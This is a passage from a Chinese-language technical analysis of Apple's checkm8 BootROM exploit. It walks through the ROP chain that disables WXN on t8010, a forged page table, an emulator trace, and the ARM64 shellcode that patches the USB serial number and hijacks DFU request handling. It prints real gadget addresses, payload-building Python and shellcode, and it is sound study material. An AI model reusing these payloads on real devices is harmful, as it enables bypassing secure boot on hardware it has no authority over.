<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%842.jpg" alt="checkm8-rop链大概结构2.jpg" /></p>

<h2 id="fx指令片段">“f(x)”指令片段</h2>

<p>fake usb_device_io_request对象的callback指针都是统一的func_gadget，地址为0x10000CC4C。</p>

<p>callback的参数就是fake usb_device_io_request对象本身，根据aarch64函数调用的参数约定，X0寄存器保存第1个参数，因此X0保存fake usb_device_io_request对象的地址。</p>

<p>因此func_gadget执行的效果是把fake usb_device_io_request对象偏移0x70处和0x78处的数据分别作为函数的参数和函数本身，进行一次f(x)调用。</p>

<p>在退出func_gadget的时候，同样也是跳过free(io_req)，直接返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环中，执行下一条func_gadget。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-10_17.01.50.png" alt="截屏2025-03-10 17.01.50.png" /></p>

<p>这么做的现实根据是什么？</p>

<p>func_gadget的选取并非随机巧合，f(x)调用其实相当于对象本身方法的调用，面向对象编程思想在代码中应该会有很多地方体现。</p>

<h2 id="关闭wxn">关闭WXN</h2>

<p>ROP链的作用是关闭WXN，使得位于0x1800B000～0x1800B400之间的shellcode可执行。</p>

<p>SecureROM在arch_cpu_init函数中使能了WXN（Write XOR eXecute Never）功能。WXN确保内存区域不能同时具有写和执行权限。如果一个内存区域被标记为可写，则不能同时标记为可执行，反之亦然。当WXN启用时，处理器会自动将可写内存区域标记为不可执行，防止恶意代码通过写入内存并执行来攻击系统。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">arch_cpu_init</span><span class="p">(</span><span class="n">bool</span> <span class="n">resume</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">......</span>
	
	<span class="kt">uint64_t</span> <span class="n">sctlr</span><span class="p">;</span>
	<span class="n">sctlr</span> <span class="o">=</span> <span class="n">arm_read_sctlr</span><span class="p">();</span>

	<span class="cm">/* turn on Stack Alignment check */</span>
	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_SA_ENABLED</span><span class="p">;</span>

	<span class="cm">/* turn on the mmu */</span>
	<span class="n">arm_mmu_init</span><span class="p">(</span><span class="n">resume</span><span class="p">);</span>
	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_M_ENABLED</span><span class="p">;</span>

	<span class="cm">/* disallow executing from writeable pages */</span>
	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_WXN_ENABLED</span><span class="p">;</span><span class="c1">//使能WXN</span>

	<span class="cm">/* turn on d-cache */</span>
	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_D_ENABLED</span><span class="p">;</span>

	<span class="cm">/* turn on i-cache */</span>
	<span class="n">sctlr</span> <span class="o">|=</span> <span class="n">SCTLR_I_ENABLED</span><span class="p">;</span>

	<span class="cm">/* enable the MMU, caches and etc. */</span>
	<span class="n">arm_write_sctlr</span><span class="p">(</span><span class="n">sctlr</span><span class="p">);</span>
	
	<span class="p">......</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>ROP链中使用到的地址如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t8010_func_gadget</span> <span class="o">=</span> <span class="mh">0x10000CC4C</span>
<span class="n">t8010_enter_critical_section</span> <span class="o">=</span> <span class="mh">0x10000A4B8</span>
<span class="n">t8010_exit_critical_section</span> <span class="o">=</span> <span class="mh">0x10000A514</span>
<span class="n">t8010_dc_civac</span> <span class="o">=</span> <span class="mh">0x10000046C</span>
<span class="n">t8010_write_ttbr0</span> <span class="o">=</span> <span class="mh">0x1000003E4</span>
<span class="n">t8010_tlbi</span> <span class="o">=</span> <span class="mh">0x100000434</span>
<span class="n">t8010_dmb</span> <span class="o">=</span> <span class="mh">0x100000478</span>
<span class="n">t8010_handle_interface_request</span> <span class="o">=</span> <span class="mh">0x10000DFB8</span>
</code></pre></div></div>

<p><strong>1. t8010_dc_civac(0x1800B0600)</strong></p>

<p>使虚拟地址0x1800B0600对应的缓存行失效，确保后面CPU能正确执行disable_wxn_arm64代码。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000046</span><span class="n">C</span>                 <span class="n">DC</span>              <span class="n">CIVAC</span><span class="p">,</span> <span class="n">X0</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000470</span>                 <span class="n">RET</span>
</code></pre></div></div>

<p><strong>2. t8010_dmb(0)</strong></p>

<p>内存屏障指令，确保该指令之前的所有指令都已经执行完毕。高性能处理器会打乱指令执行的顺序，有时候需要手动同步。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000047</span><span class="mi">8</span>                 <span class="n">DMB</span>             <span class="n">SY</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000047</span><span class="n">C</span>                 <span class="n">RET</span>
</code></pre></div></div>

<p><strong>3. t8010_enter_critical_section(0)</strong></p>

<p>屏蔽中断，确保后续修改页表的操作是原子操作。</p>

<p><strong>4. t8010_write_ttbr0(0x1800B0000)</strong></p>

<p>设置页表基地址寄存器TTBR0_EL1的值为0x1800B0000。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mf">00000001000003E4</span>                 <span class="n">MSR</span>             <span class="n">TTBR0_EL1</span><span class="p">,</span> <span class="n">X0</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mf">00000001000003E8</span>                 <span class="n">ISB</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">00000001000003</span><span class="n">EC</span>                 <span class="n">RET</span>
</code></pre></div></div>

<p>攻击者写入INSECURE_MEMORY区域的payload也被视为页表。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E4%BC%AA%E9%80%A0%E9%A1%B5%E8%A1%A8.jpg" alt="checkm8-伪造页表.jpg" /></p>

<p>上文提到SecureROM把MMU配置为使用2级页表，16KB页面。</p>

<p>0x100000000 -&gt; 0x100000000 (rx)和0x180000000 -&gt; 0x180000000 (rw)维持原地址映射关系不变，确保代码段能正常执行。</p>

<p>0x182000000 -&gt; 0x180000000 (rx)是攻击者新增的页表项，作用是将payload单独映射成一个具有执行权限的段，下步可以执行disable_wxn_arm64指令。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E5%81%9A%E4%BA%86%E4%B8%A4%E4%BB%BD%E6%98%A0%E5%B0%84.jpg" alt="checkm8-做了两份映射.jpg" /></p>

<p>那么攻击者为什么不直接修改0x180000000 -&gt; 0x180000000 (rx)呢？</p>

<p>答：因为在执行disable_wxn_arm64关闭WXN之前，R(读)和X(执行)只能同时拥有一个，如果直接设置0x180000000 -&gt; 0x180000000 (rx)，后续disable_wxn_arm64中就无法对旧的页表进行修改，上文提到旧的L2页表位于0x1800A0000。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                       <span class="n">VA</span>             <span class="n">PA</span>
<span class="p">...</span>
<span class="mh">0x1800B0400</span><span class="o">:</span> <span class="mh">0x1000006a5</span>           <span class="mh">0x100000000</span> <span class="o">-&gt;</span> <span class="mh">0x100000000</span> <span class="p">(</span><span class="n">rx</span><span class="p">)</span>
<span class="p">...</span>
<span class="mh">0x1800B0600</span><span class="o">:</span> <span class="mh">0x60000180000625</span>      <span class="mh">0x180000000</span> <span class="o">-&gt;</span> <span class="mh">0x180000000</span> <span class="p">(</span><span class="n">rw</span><span class="p">)</span>
<span class="mh">0x1800B0608</span><span class="o">:</span> <span class="mh">0x1800006a5</span>           <span class="mh">0x182000000</span> <span class="o">-&gt;</span> <span class="mh">0x180000000</span> <span class="p">(</span><span class="n">rx</span><span class="p">)</span>
<span class="p">...</span>
</code></pre></div></div>

<p>页表项后缀为0x6a5表示读/执行权限，指向块类型页面。在2级页表，16KB页面粒度的配置下，块类型页面的大小为32MB，块类型页面是直接返回给系统使用的页面类型。</p>

<p>页表项前缀为0x6后缀为0x625表示读/写权限，没有执行权限，指向块类型页面，长度为32MB。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E9%A1%B5%E8%A1%A8%E5%B1%9E%E6%80%A7.jpg" alt="checkm8-页表属性.jpg" /></p>

<p><strong>5. t8010_tlbi(0)</strong></p>

<p>使TLB缓存记录失效，使用新的页表进行地址转换。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000434</span>                 <span class="n">DSB</span>             <span class="n">SY</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000043</span><span class="mi">8</span>                 <span class="n">TLBI</span>            <span class="n">VMALLE1</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">000000010000043</span><span class="n">C</span>                 <span class="n">DSB</span>             <span class="n">SY</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000440</span>                 <span class="n">ISB</span>
<span class="p">.</span><span class="n">shellcode</span><span class="o">:</span><span class="mo">0000000100000444</span>                 <span class="n">RET</span>
</code></pre></div></div>

<p><strong>6. 0x1820B0610 — disable_wxn_arm64(0)</strong></p>

<p>disable_wxn_arm64指令片段起始地址0x1820B0610，映射到物理地址0x1800B0610，可执行。</p>

<p>把旧的L2页表中，虚拟地址0x180000000的映射关系不变，去掉了PXN和NX位，获得了执行权限，空间长度为32MB，并且关闭了WXN。payload所在的INSECURE_MEMORY段因此也变为可读可执行。</p>

<p>因为后面执行t8010_shellcode要求BOOT_TRAMPOLINE段同时具有RWX权限，因此要禁用WXN。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_09.56.28.png" alt="截屏2025-03-11 09.56.28.png" /></p>

<p>在arm_mmu_init()函数初始化页表的过程中，不可执行段的页表项设置了PXN和XN比特位，在disable_wxn_arm64中把这两个位清零，使得页面具有执行权限。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_10.12.13.png" alt="截屏2025-03-11 10.12.13.png" /></p>

<p><strong>7. t8010_write_ttbr0(0x1800A0000)</strong></p>

<p>恢复旧的页表。因为旧的页表中还包含设备IO寄存器地址到虚拟地址空间的映射，恢复旧页表确保系统功能正常。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-09_13.00.49.png" alt="截屏2025-03-09 13.00.49.png" /></p>

<p><strong>8. t8010_tlbi(0)</strong></p>

<p>使TLB缓存记录失效，使用新的页表进行地址转换。</p>

<p><strong>9. t8010_exit_critical_section(0)</strong></p>

<p>恢复中断。</p>

<h2 id="跳转到shellcode执行">跳转到shellcode执行</h2>

<p>经过上面的步骤，虚拟地址0x180000000～0x182000000获得RWX权限。</p>

<p>while(aborted_list)循环调用最后一个callback，进入0x1800B0000执行t8010_shellcode代码。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-rop%E9%93%BE%E5%A4%A7%E6%A6%82%E7%BB%93%E6%9E%84-%E8%BF%9B%E5%85%A5shellcode%E8%BF%90%E8%A1%8C.jpg" alt="checkm8-rop链大概结构-进入shellcode运行.jpg" /></p>

<h2 id="crauemu插件模拟rop过程">crauEmu插件模拟ROP过程</h2>

<p>crauEmu是基于uEmu开发的IDA插件，相比于uEmu增加了rop调试功能，使rop过程可视化。</p>

<p>这里模拟控制流劫持后，usb_rop_callbacks的执行过程。</p>

<ul>
  <li>初始设置</li>
</ul>

<p>synopsys_otg_abort_endpoint函数的while(aborted_list)循环开始ROP链的执行。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">usb_core_complete_endpoint_io</span> <span class="p">(</span><span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">io_req</span><span class="p">){</span>
	<span class="k">if</span><span class="p">(</span><span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="p">}</span>
    
	<span class="n">free</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
	<span class="n">io_req</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">synopsys_otg_abort_endpoint</span><span class="p">(</span><span class="n">u_int32_t</span> <span class="n">endpoint</span><span class="p">){</span>

	<span class="p">......</span>
	
	<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span><span class="p">;</span>
	<span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_head</span> <span class="o">=</span> <span class="n">ep</span><span class="o">-&gt;</span><span class="n">io_tail</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	
	<span class="p">......</span>

	<span class="k">while</span><span class="p">(</span><span class="n">aborted_list</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">usb_device_io_request</span> <span class="o">*</span><span class="n">aborted_req</span> <span class="o">=</span> <span class="n">aborted_list</span><span class="p">;</span>
		<span class="n">aborted_list</span> <span class="o">=</span> <span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
		<span class="n">aborted_req</span><span class="o">-&gt;</span><span class="n">status</span> <span class="o">=</span> <span class="n">USB_IO_ABORTED</span><span class="p">;</span>
		<span class="n">usb_core_complete_endpoint_io</span><span class="p">(</span><span class="n">aborted_req</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>crauEmu设置PC指针为0x1000055D4，该地址对应while(aborted_list)循环的入口。</p>

<p>X19寄存器设置为0x1800B0800，对应第一个fake usb_device_io_request对象。</p>

<p>fake usb_device_io_request的next指针指向下一个fake usb_device_io_request，保存在X21寄存器中，作为循环变量。</p>

<p>三个hook函数的作用是，执行到特定的地址就触发ret_hook动作。</p>

<p>ret_hook的作用是跳过函数或者某些语句的执行，这里是：</p>

<p>0x10000a4b8 — enter_critical_section 屏幕中断</p>

<p>0x10000a514 — exit_critical_section 恢复中断</p>

<p>0x1820b0610 — disable_wxn_arm64 关闭WXN</p>

<p>这些位置并不影响ROP的往下推进，为了简化过程，选择跳过这些函数。</p>

<p>点击“Initiate”按钮可以看到寄存器的值被设置。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_11.36.32.png" alt="截屏2025-03-11 11.36.32.png" /></p>

<ul>
  <li>单步观察</li>
</ul>

<p>usb_core_complete_endpoint_io最终调用了fake usb_device_io_request::callback</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">synopsys_otg_abort_endpoint</span><span class="p">;</span>
         <span class="n">usb_core_complete_endpoint_io</span><span class="p">;</span>
				         <span class="n">io_req</span><span class="o">-&gt;</span><span class="n">callback</span><span class="p">(</span><span class="n">io_req</span><span class="p">);</span>
</code></pre></div></div>

<p>停在io_req→callback(io_req)观察，此时栈上面的返回地址为0x1000055D0，是usb_core_complete_endpoint_io函数的while(aborted_list)循环的起始位置。</p>

<p>X0是位于INSECURE_MEMORY的伪造usb_device_io_request对象，</p>

<p>X8是callback指针，指向“f(x)”指令片段。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.20.54.png" alt="截屏2025-03-11 14.20.54.png" /></p>

<p>进入“f(x)”指令片段，X0 = 0x1800b0600， X10 = t8010_dc_civac，</p>

<p>等效于t8010_dc_civac(0x1800b0600)。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.34.15.png" alt="截屏2025-03-11 14.34.15.png" /></p>

<p>运行到“f(x)”指令的结束部分，返回地址出栈，保存到X30寄存器，</p>

<p>ret之后返回到synopsys_otg_abort_endpoint函数的while(aborted_list)循环，进行下一条gadget的执行，这样就避免了free一个损坏的堆块引发panic。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.41.21.png" alt="截屏2025-03-11 14.41.21.png" /></p>

<ul>
  <li>ROP结束状态</li>
</ul>

<p>X10 = 0x1800B0000，保存t8010_shellcode，通过B指令跳转过去执行。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_14.55.10.png" alt="截屏2025-03-11 14.55.10.png" /></p>

<h1 id="shellcode执行">shellcode执行</h1>

<p><strong>1. shellcode的结构</strong></p>

<p>shellcode的构造函数如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">t8010_handler</span> <span class="o">=</span> <span class="nf">asm_arm64_x7_trampoline</span><span class="p">(</span><span class="n">t8010_handle_interface_request</span><span class="p">)</span> <span class="o">+</span> \
								<span class="nf">asm_arm64_branch</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="o">+</span> \
								<span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">usb_0xA1_2_arm64</span><span class="sh">'</span><span class="p">,</span> <span class="n">constants_usb_t8010</span><span class="p">)[</span><span class="mi">4</span><span class="p">:]</span>
								
<span class="n">t8010_shellcode</span> <span class="o">=</span> <span class="nf">prepare_shellcode</span><span class="p">(</span><span class="sh">'</span><span class="s">checkm8_arm64</span><span class="sh">'</span><span class="p">,</span> <span class="n">constants_checkm8_t8010</span><span class="p">)</span>

<span class="n">t8010_shellcode</span> <span class="o">=</span> <span class="n">t8010_shellcode</span> <span class="o">+</span> \
									<span class="sh">'</span><span class="se">\0</span><span class="sh">'</span> <span class="o">*</span> <span class="p">(</span><span class="n">PAYLOAD_OFFSET_ARM64</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">t8010_shellcode</span><span class="p">))</span> <span class="o">+</span> \
									<span class="n">t8010_handler</span>
</code></pre></div></div>

<p>shellcode短小精悍，使用1024字节实现了USB序列号修改、劫持USB处理句柄、把USB功能代码拷贝到BOOT_TRAMPOLINE内存区域、USB功能代码这4个功能。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%BA%AFshellcode.jpg" alt="checkm8-纯shellcode.jpg" /></p>

<p><strong>2. 恢复USB配置描述符</strong></p>

<p>SecureROM初始化阶段为2个USB配置描述符在堆上分配空间，地址分别保存在usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor两个全局变量中。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">u_int8_t</span> <span class="o">*</span><span class="n">usb_core_hs_configuration_descriptor</span><span class="p">;</span>
<span class="k">static</span> <span class="n">u_int8_t</span> <span class="o">*</span><span class="n">usb_core_fs_configuration_descriptor</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">usb_core_start</span><span class="p">(){</span>
		<span class="p">......</span>
    <span class="n">usb_core_hs_configuration_descriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">total_len</span><span class="p">);</span>
    <span class="n">usb_core_fs_configuration_descriptor</span> <span class="o">=</span> <span class="p">(</span><span class="n">u_int8_t</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">total_len</span><span class="p">);</span>
    <span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div>

<p>两个全局变量在内存中的位置相邻，位于0x180088A30和0x180088A38。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_19.42.26.png" alt="截屏2025-03-11 19.42.26.png" /></p>

<p>在控制流劫持过程中，覆盖usb_device_io_request对象的同时，也破坏了堆上面的hs_configuration和fs_configuration对象。这两个对象的内容在编译时确定，因此可以把原有的内容手动复制回去。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>
<span class="p">.</span><span class="n">set</span> <span class="n">gUSBDescriptors</span><span class="p">,</span>              <span class="mh">0x180088A30</span>

<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBDescriptors</span>
<span class="n">LDP</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>   <span class="c1">//X0 = usb_core_hs_configuration_descriptor, X1=usb_core_fs_configuration_descriptor</span>
<span class="n">ADR</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">USB_DESCRIPTOR</span>
<span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X2</span><span class="p">]</span>       <span class="c1">//恢复usb_core_hs_configuration_descriptor和usb_core_fs_configuration_descriptor</span>
<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>       <span class="c1">//一共32字节</span>
<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>
<span class="n">LDP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X2</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>
<span class="n">STP</span>  <span class="n">X3</span><span class="p">,</span> <span class="n">X4</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">,</span><span class="err">#</span><span class="mh">0x10</span><span class="p">]</span>

<span class="n">USB_DESCRIPTOR</span><span class="o">:</span>
<span class="p">.</span><span class="n">word</span> <span class="mh">0x190209</span><span class="p">,</span> <span class="mh">0x80050101</span><span class="p">,</span> <span class="mh">0x409fa</span><span class="p">,</span> <span class="mh">0x1fe0000</span><span class="p">,</span> <span class="mh">0x21070000</span><span class="p">,</span> <span class="mh">0xa01</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0x0</span>
</code></pre></div></div>

<p><strong>3. “     PWND:[checkm8]”</strong></p>

<p>首先找到序列号字符串的结束符，再把” PWND:[checkm8]”字符串拷贝到原始序列号末尾，得到新的序列号字符串。</p>

<p>调用usb_create_string_descriptor(gUSBSerialNumber)生成新的序列号描述符。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>
<span class="p">.</span><span class="n">pool</span>
<span class="p">.</span><span class="n">set</span> <span class="n">gUSBSerialNumber</span><span class="p">,</span>             <span class="mh">0x180083CF8</span>
<span class="p">.</span><span class="n">set</span> <span class="n">usb_create_string_descriptor</span><span class="p">,</span> <span class="mh">0x10000D150</span>
<span class="p">.</span><span class="n">set</span> <span class="n">gUSBSRNMStringDescriptor</span><span class="p">,</span>     <span class="mh">0x1800805DA</span>

 	<span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSerialNumber</span>
<span class="n">find_zero_loop</span><span class="o">:</span>
  <span class="n">ADD</span>  <span class="n">X0</span><span class="p">,</span> <span class="n">X0</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
  <span class="n">LDRB</span> <span class="n">W1</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>
  <span class="n">CBNZ</span> <span class="n">W1</span><span class="p">,</span> <span class="n">find_zero_loop</span> <span class="c1">//找到序列号的结束符\x00</span>

  <span class="n">ADR</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">PWND_STRING</span>
  <span class="n">LDP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>
  <span class="n">STP</span>  <span class="n">X2</span><span class="p">,</span> <span class="n">X3</span><span class="p">,</span> <span class="p">[</span><span class="n">X0</span><span class="p">]</span>       <span class="c1">//把" PWND:[checkm8]"字符串拷贝到原始序列号末尾</span>

  <span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSerialNumber</span>
  <span class="n">LDR</span>  <span class="n">X1</span><span class="p">,</span> <span class="o">=</span><span class="n">usb_create_string_descriptor</span>
  <span class="n">BLR</span>  <span class="n">X1</span>         <span class="c1">//usb_create_string_descriptor(gUSBSerialNumber)，返回下标</span>

  <span class="n">LDR</span>  <span class="n">X1</span><span class="p">,</span> <span class="o">=</span><span class="n">gUSBSRNMStringDescriptor</span> <span class="c1">//usb_core_device_descriptor.iSerialNumber</span>
  <span class="n">STRB</span> <span class="n">W0</span><span class="p">,</span> <span class="p">[</span><span class="n">X1</span><span class="p">]</span>   <span class="c1">//把新的序列号描述符下标保存到usb_core_device_descriptor.iSerialNumber字段</span>
									<span class="c1">//以上我们就能在设备管理器中看到iphone设备的序列号末尾被加上了" PWND:[checkm8]"</span>

<span class="n">PWND_STRING</span><span class="o">:</span>
<span class="p">.</span><span class="n">asciz</span> <span class="s">" PWND:[checkm8]"</span>
</code></pre></div></div>

<p>usb_create_string_descriptor函数把生成的序列号描述符保存在usb_core_string_descriptor全局数组中，返回数组下标。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.17.25.png" alt="截屏2025-03-11 20.17.25.png" /></p>

<p>最后把数组下标设置到全局对象usb_core_device_descriptor的iSerialNumber字段，篡改后的序列号就对外可见了。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%201.jpg" alt="checkm8-第 15 页.jpg" /></p>

<p>主机端查看USB设备信息，发现iPhone设备的序列号被修改了。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-06_20.00.32.png" alt="截屏2025-03-06 20.00.32.png" /></p>

<p><strong>4. 劫持USB报文处理句柄</strong></p>

<p>全局对象usb_dfu_interface_instance的handle_request指向的函数实现了USB DFU协议栈，负责处理主机发送的bmRequestType=0x21的Setup Transaction。</p>

<p>shellcode通过将handle_request函数指针覆盖为攻击者自定义的函数即可劫持对DFU请求的处理。</p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/checkm8-%E7%AC%AC_15_%E9%A1%B5%202.jpg" alt="checkm8-第 15 页.jpg" /></p>

<p><img src="/assets/posts/2025-05-25-深入分析苹果设备-checkm8-漏洞/%E6%88%AA%E5%B1%8F2025-03-11_20.36.08.png" alt="截屏2025-03-11 20.36.08.png" /></p>

<p>shellcode把usb_dfu_interface_instance.handle_request覆盖为0x1800AFC18，该地址位于BOOT_TRAMPOLINE内存区域，经过前面关闭WXN操作之后具有RWX权限。</p>

<p>shellcode中绿色部分是攻击者自定义的USB功能代码，将被拷贝到0x1800AFC18开始的区域。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">text</span>

<span class="p">.</span><span class="n">pool</span>
<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_OFFSET</span><span class="p">,</span>               <span class="mi">384</span>
<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_SIZE</span><span class="p">,</span>                 <span class="mi">576</span>
<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_DEST</span><span class="p">,</span>                 <span class="mh">0x1800AFC00</span>
<span class="p">.</span><span class="n">set</span> <span class="n">PAYLOAD_PTR</span><span class="p">,</span>                  <span class="mh">0x180088B48</span>
  
  <span class="n">LDR</span>  <span class="n">X0</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_DEST</span>    <span class="c1">//0x1800AFC00</span>
  <span class="n">ADR</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">_main</span>
  <span class="n">LDR</span>  <span class="n">X2</span><span class="p">,</span> <span class="o">=</span><span class="n">PAYLOAD_OFFSET</span>  <span class="c1">//384</span>
  <span class="n">ADD</span>  <span class="n">X1</span><span class="p">,</span> <span class="n">X1</span><span class="p">,</span> <span class="n">X2</span>           <span class="c1">//X1 就是蓝色和绿色阶段的起始地址</span>
